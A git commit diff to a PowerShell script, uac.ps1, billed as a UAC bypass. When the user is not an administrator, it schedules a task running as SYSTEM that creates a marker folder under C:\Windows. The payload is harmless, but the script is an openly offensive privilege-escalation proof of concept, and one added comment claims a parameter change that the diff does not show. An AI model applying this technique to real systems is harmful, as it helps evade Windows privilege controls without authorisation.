bfe1ee148a60879a8e719e16b67a0577d8272666
Shad0w-Eagle <167417449+Shad0w-Eagle@users.noreply.github.com>
2025-02-25 17:19:31 +0530

    Update uac.ps1

--- uac.ps1
+++ uac.ps1
@@ -4,11 +4,13 @@ if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
     mkdir C:\Windows\uas-bypass
 } else {
     # Create a scheduled task to run as administrator
-    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command {mkdir C:\Windows\uas-bypass}"
+    $taskAction = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-Command {mkdir C:\Windows\uas-bypass}"
     $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)  # Run after 10 seconds
     $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
-    $taskSettings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries $true  # Adjusted settings
-    
+
+    # Correct task settings, removed invalid parameter
+    $taskSettings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries $true
+
     # Register the scheduled task
     Register-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings -TaskName "BypassUACTask"
 
